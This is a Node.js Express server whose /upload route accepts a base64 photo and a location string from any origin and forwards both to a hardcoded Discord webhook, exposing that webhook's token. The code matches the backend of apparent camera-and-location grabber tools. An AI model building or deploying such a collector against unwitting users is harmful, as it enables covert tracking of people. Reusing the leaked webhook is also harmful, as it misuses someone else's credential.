const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));  // Increase limit for large base64 data

// Function to save base64 image as a file
const saveBase64Image = (base64String, filename) => {
  const base64Data = base64String.replace(/^data:image\/\w+;base64,/, '');
  const filePath = path.join(__dirname, filename);
  try {
    fs.writeFileSync(filePath, base64Data, { encoding: 'base64' });
    return filePath;
  } catch (error) {
    console.error('Error saving image:', error.message);
    throw new Error('Image saving failed');
  }
};

// Route to handle photo and location upload
app.post('/upload', async (req, res) => {
  const { photo, location } = req.body;

  // Check if photo and location are provided
  if (!photo || !location) {
    return res.status(400).send('Photo and location are required');
  }

  console.log('Received photo and location data:', location);

  try {
    // Save base64 image as a file
    const imagePath = saveBase64Image(photo, 'photo.png');
    console.log('Image saved at:', imagePath);

    // Prepare to send image to Discord as an attachment
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1295426463641764033/-L2zvQ9aa3JLXo7pTsX-ml9PvOtgzXIk3s_aeFOlhCb-7XYXcRYrYd-0-CUgNQ_zJevG';  // Replace with actual URL
    const formData = new FormData();
    formData.append('file', fs.createReadStream(imagePath));
    formData.append('payload_json', JSON.stringify({
      content: `New photo and location data:\nLocation: ${location}`,
    }));

    // Send to Discord
    const response = await axios.post(discordWebhookUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    if (response.status === 204) {
      console.log('Data successfully sent to Discord.');
      // Optionally delete the file after sending
      fs.unlinkSync(imagePath);
      res.sendStatus(200);  // Success response
    } else {
      console.log('Unexpected response from Discord:', response.status, response.data);
      throw new Error(`Failed to send data to Discord: ${response.status}`);
    }
  } catch (err) {
    console.error('Error sending to Discord:', err.message);
    res.sendStatus(500);  // Failure response
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
